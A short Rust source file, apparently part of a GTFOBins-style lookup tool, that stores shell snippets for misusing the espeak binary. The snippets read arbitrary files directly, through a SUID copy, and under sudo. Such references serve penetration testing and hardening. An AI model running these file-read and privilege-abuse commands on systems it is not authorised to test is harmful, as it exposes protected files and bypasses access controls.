
pub static BIN_NAME: &'static str = "espeak";
pub static BIN_DESC: &'static str = "The file content appears in the middle of other textual information, thus it might not be suitable to read arbitray binary files.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    espeak -qXf "$LFILE"
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which espeak) .

    LFILE=file_to_read
    ./espeak -qXf "$LFILE"
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo espeak -qXf "$LFILE"
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
